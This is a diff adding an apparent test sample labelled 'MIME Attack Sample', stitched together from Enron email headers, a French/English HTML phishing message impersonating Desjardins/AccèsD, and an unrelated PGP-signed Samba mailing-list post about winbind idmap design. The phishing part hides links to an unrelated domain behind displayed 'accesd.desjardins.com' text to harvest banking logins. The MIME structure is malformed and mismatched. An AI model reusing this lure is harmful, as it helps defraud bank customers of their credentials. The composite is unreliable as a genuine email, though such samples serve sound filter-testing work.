@@ -1,0 +1,223 @@
+From: rmorgan@morgangroup.com
+To: wes.colwell@enron.com, jeffery.ader@enron.com, john.arnold@enron.com, 
+Subject: MIME Attack Sample
+Content-Type: multipart/related; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/plain
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1HcQeN-0007TT-P7@server.fastbox.info>
+Date: Fri, 13 Apr 2007 13:37:35 -0500
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - server.fastbox.info
+X-AntiAbuse: Original Domain - speedy.uwaterloo.ca
+X-AntiAbuse: Originator/Caller UID/GID - [99 99] / [47 12]
+X-AntiAbuse: Sender Address Domain - server.fastbox.info
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+Status: O
+Content-Length: 5798
+Lines: 104
+
+<html>
+
+<head>
+<title>Mouvement Desjardins</title>
+<style type="text/css">
+<!--
+.style1 {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 12px;
+}
+.style2 {
+	font-size: 14px;
+	font-weight: bold;
+}
+.style4 {font-size: 12px}
+-->
+</style>
+</head>
+<table width="777" border="0">
+  <tr>
+    <td width="17"> </td>
+    <td width="750"><TABLE width=750 border=1 align="right" cellPadding=0 cellSpacing=0 bordercolor="e1dcd0">
+      <TBODY>
+        <TR>
+          <TD width=750 bgcolor="efede6"><TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#009966 border=0>
+              <TBODY>
+                <TR>
+                  <TD><IMG 
+src="https://accesd.desjardins.com/public/0939/fr_CA_ACCESD/image/bandeau.gif"></TD>
+                </TR>
+              </TBODY>
+            </TABLE>
+              <P align="justify"><SPAN class=Estilo6><span class="style2"><FONT color=#009966> Cher(e) membre 
+                Desjardins/ AccsD</FONT></span><FONT lang=0 face=Estilo size=2 
+PTSIZE="10" FAMILY="SANSSERIF"><BR>
+                  <BR>
+                  </FONT><FONT lang=0 
+PTSIZE="10" FAMILY="SANSSERIF"><span class="style1">Desjardins tient  vous signaler que votre dernire transaction n'a pas t automatiquement enregistr d  un nombre elev de transaction simultane. Le dpartement de vrification comptable du Groupe Desjardins  corriger le problme dans les comptes concerns. Si toutefois vous notez une diffrence, nous vous prions de nous en aviser. Si vous constatez une autre erreur, communiquez avec votre institution durant les heures de <a href="http://www.desjardins.com/fr/votre_caisse/index.jsp">votre caisse</a>.</span></FONT></SPAN>
+              <P align="justify"><span class="Estilo6"><font size=3 face="Estilo, Helvetica, sans-serif" class="style1">Pour accder  
+                votre compte et vrifier que tout soit normal, cliquez sur ce lien scuris si dessus :</font></span>
+              <P align="justify"><A 
+href="http://www.philsfeatheredfriends.com/sec/accesdesjardins/auportADPortail/ObtenirPageAccueil.doorigine_or/" target=_blank type=hidden><FONT 
+size=4>https://accesd.desjardins.com/</FONT></A>
+              <p class=style1>Soyez assur que Desjardins met tout en oeuvre pour protger les utilisateurs de ses services Internet </p>
+            <p class=Estilo6><font size=2 face="Arial, Helvetica, sans-serif" class="style1">Le Groupe 
+              Desjardins vous remercie de votre clientle et apprcie votre comprhension.</font></p>
+            <p class=Estilo6><STRONG><FONT face="Estilo, Helvetica, sans-serif" color=#009966 
+size=2>Desjardins / AccsD</FONT></STRONG><BR>
+                  <FONT size=2>Conjuguer avoirs et 
+                    tres 
+                </FONT></p>
+            <TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#009966 border=0>
+                <TBODY>
+                  <TR>
+                    <TD><IMG 
+src="https://accesd.desjardins.com/public/0939/fr_CA_ACCESD/image/bandeau.gif"></TD>
+                  </TR>
+                </TBODY>
+              </TABLE>
+            <p><span class="style2"><FONT color=#009966>Dear Desjardins Member</FONT></span></p>
+            <P align="justify" class="style1">The Group Desjardins would like to inform you that your last transaction was not automatically recorded due to a high number of simultaneous transactions. Desjardins audit department corrected the problem in the accounts concerned. However if you notice a difference in your folio, we ask you to advise us by communicating with your institution during <a href="http://www.desjardins.com/fr/votre_caisse/index.jsp">opening hours</a>
+              <P align="justify"><span class="style1">We encourage you to    connect to your account and verify your transactions, by clicking the secured url below :<br>
+                    <BR>
+                </span><span class="style4"><A 
+href="http://www.philsfeatheredfriends.com/sec/accesdesjardins/auportADPortail/ObtenirPageAccueil.doorigine_or/" target=_blank type=hidden><FONT 
+size=4>https://accesd.desjardins.com/</FONT></A></span><span class="style1"> </span>
+              <P class=style1>Be assured that Desjardins makes every effort to protect our internet users </P>
+            <P class=style1>The Group Desjardins  thanks you for your business and appreciates your comprehension</P>
+            <P class=Estilo6><STRONG><FONT face="Estilo, Helvetica, sans-serif" color=#009966 
+size=2><br>
+              Desjardins / AccsD</FONT></STRONG><BR>
+              <FONT size=2>Money working for people </FONT></P>
+            <P><FONT face="Estilo, Helvetica,
+sans-serif" size=2><FONT color=#999999 
+size=1>Svp ne rpondez pas  ce courriel car c'est seulement un avis. Le courrier envoy  cette adresse ne peut pas tre rpondu. 
+              </FONT></FONT></P>
+            <TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+                <TBODY>
+                  <TR>
+                    <TD width=5></TD>
+                    <TD class="footerText Estilo2" vAlign=bottom align=left><P class=style1>Copyright  2006 Mouvement des caisses Desjardins. Tous droits 
+                      rservs.</P></TD>
+                    <TD align=right><P><SPAN class=bodyText></FONT></SPAN> </P></TD>
+                  </TR>
+                  <TR>
+                    <TD width=5></TD>
+                    <TD class=Estilo5 colSpan=2></TD>
+                  </TR>
+                </TBODY>
+            </TABLE>
+            <P><FONT face="Estilo, Helvetica,
+sans-serif" size=2><FONT color=#999999 
+size=1></FONT></FONT><img src="https://accesd.desjardins.com/public/0939/fr_CA_ACCESD/image/securite.gif" border="0" width="140" height="39"></P></TD>
+        </TR>
+      </TBODY>
+    </TABLE></td>
+  </tr>
+</table>
+</P>
+</body>
+
+</html>
+
+
+
+--DELIMITER
+Content-Disposition: attachment; filename=signature.asc
+Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature" 
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+ SHA1
+
+James Peach wrote:
+
+> There's two cases for mapping from SIDs to UGIDs.
+> 
+> First case is where full SIDs are explicitly stored 
+> in the directory or have a static partitioning (like
+> Unix Users and Unix Groups). In this case, you don't
+> need to be told what kind of ID the caller is looking
+> for, because the SID is globally unique, and must only 
+> map to one ID.
+
+That is the idmap_ad case where it is easy for the idmap
+backed to determine the SID type.
+
+> Second case is where the SID is dynamically 
+> generated from other information in the directory. In
+> this case, knowing the type of ID in advance helps
+> a lot and can prevent you generating bogus SIDs.
+> 
+> I take it that it is this second case that is problematic?
+
+It is the fact that the *default* winbind setup (using
+tdb, rid, or ldap) requires that the idmap child call
+back into the winbindd parent to get the SID type so
+it knows what to do.  This is a layering violation.
+
+The caller asks the idmap backend to give it an id
+but the backend the asks the caller to tell it
+what type of SID it is.  If this is needed, then the type
+simply must be specified as a parameter or else we
+will be tracking deadlocks in every idmap backend
+implementation we have.
+
+The problem was that the design was built for a specific
+case and not the general case and is therefore not sufficient.
+
+>> Right now I'm going to do several things in order to get
+>> the code to a release point.
+>>
+>> (a) Remove WINBINDD_SIDS_TO_XIDS from winbindd_nss.h to
+>>    prevent us from having to support the broken call in
+>>    future releases.  The existing idmap_methods API will
+>>    not change but will become solely an internal interface
+>>    used by winbindd.
+>>
+>> (b) Overload the id_map.xid.type to be specified by the caller
+>>    and not filled by the idmap backend.
+> 
+> So existing idmap modules will need to be changed?
+
+That's debatable.  Right now, I'm considering the cache that
+would require no change the the idmap interface, just how it
+is used.
+
+An example mapping on SID to uid would be as so.  The
+caller fills in these values:
+
+	sid_copy( id.sid, sid_to_translate );
+	id.xid.type = ID_TYPE_UID;
+
+Then the backend only fills in the id.xid.id field if the SID
+does in fact resolve to a uid.
+
+In most cases I've considered for the caller already knows
+the SID type so this is no additional burden.
+
+This would be the bare minimum fix for 3.0.25.  3.0.26 would
+change the idmap API but as there are no external consusmers
+other than winbindd, this should be easy enough.
+
+
+
+
+cheers, jerry
+--BOUNDARY
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.3 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iD8DBQFGJ6z3IR7qMdg1EfYRAnDRAJ97e6yw2P8fVn2hZeBI/NfKBZDhSgCdFBvG
+hBevuH5gRTkSHR2Vw33ERBE=
+=Qoho
+-----END PGP SIGNATURE-----
+
+
+-BOUNDARY--
+--DELIMITER--
